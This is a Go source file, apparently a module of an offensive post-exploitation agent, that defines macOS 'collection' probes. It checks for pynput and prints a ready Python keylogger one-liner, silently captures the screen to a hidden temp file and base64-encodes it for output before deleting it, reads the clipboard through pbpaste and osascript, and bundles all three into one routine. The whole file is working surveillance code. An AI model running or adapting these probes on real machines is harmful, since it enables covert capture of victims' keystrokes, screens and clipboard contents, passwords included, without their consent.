package module

import (
	"fmt"
	"strings"
)

// RunCollectKeylog captures keystrokes on macOS.
// Requires accessibility permissions or Python with pynput.
func RunCollectKeylog(params map[string]interface{}) (string, error) {
	_ = params
	cmds := []string{
		"echo '=== Keylog ==='",
		"echo 'macOS keylog requires accessibility permissions or Python'",
		"python3 -c \"import pynput\" 2>/dev/null && echo 'pynput available — use Python keylogger' || echo 'pynput not available'",
		"echo 'Try: python3 -c \"from pynput.keyboard import Listener; l=Listener(on_press=lambda k: print(k)); l.start(); import time; time.sleep(5); l.stop()\"'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectScreenshot captures the screen on macOS.
func RunCollectScreenshot(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Screenshot ==='",
		"screencapture -x /tmp/.ananse_scr.png 2>/dev/null && base64 /tmp/.ananse_scr.png && rm -f /tmp/.ananse_scr.png || echo 'screencapture failed'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectClipboard reads clipboard content on macOS.
func RunCollectClipboard(_ map[string]interface{}) (string, error) {
	cmds := []string{
		"echo '=== Clipboard ==='",
		"pbpaste 2>/dev/null || echo 'clipboard read failed'",
		"echo '--- Secondary ---'",
		"osascript -e 'the clipboard' 2>/dev/null || echo 'osa clipboard failed'",
	}
	return run(strings.Join(cmds, "\n"))
}

// RunCollectAll runs all collection probes.
func RunCollectAll(params map[string]interface{}) (string, error) {
	var parts []string
	probes := []struct {
		name string
		fn   func(map[string]interface{}) (string, error)
	}{
		{"KEYLOG", RunCollectKeylog},
		{"SCREENSHOT", RunCollectScreenshot},
		{"CLIPBOARD", RunCollectClipboard},
	}
	for _, p := range probes {
		out, err := p.fn(params)
		if err != nil {
			parts = append(parts, fmt.Sprintf("=== %s ===\nERROR: %v", p.name, err))
		} else {
			parts = append(parts, fmt.Sprintf("=== %s ===\n%s", p.name, out))
		}
	}
	return strings.Join(parts, "\n\n"), nil
}
